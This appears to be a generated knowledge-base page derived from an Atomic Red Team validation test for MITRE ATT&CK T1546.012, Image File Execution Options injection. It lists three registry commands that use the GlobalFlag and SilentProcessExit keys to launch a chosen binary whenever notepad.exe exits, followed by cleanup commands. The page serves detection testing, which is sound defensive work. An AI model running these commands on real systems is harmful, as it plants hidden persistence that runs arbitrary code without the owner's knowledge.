---
atomic_guid: "46b1f278-c8ee-4aa5-acce-65e77b11f3c1"
title: "IFEO Global Flags"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.012"
attack_technique_name: "Event Triggered Execution: Image File Execution Options Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.012/T1546.012.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "46b1f278-c8ee-4aa5-acce-65e77b11f3c1"
  - "IFEO Global Flags"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# IFEO Global Flags

Leverage Global Flags Settings

## Metadata

- Atomic GUID: 46b1f278-c8ee-4aa5-acce-65e77b11f3c1
- Technique: T1546.012: Event Triggered Execution: Image File Execution Options Injection
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1546.012/T1546.012.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.012]]

## Input Arguments

### payload_binary

- description: Binary To Execute
- type: path
- default: C:\Windows\System32\cmd.exe

### target_binary

- description: Binary To Attach To
- type: path
- default: notepad.exe

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
```

### Cleanup

```commandprompt
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.012/T1546.012.yaml)
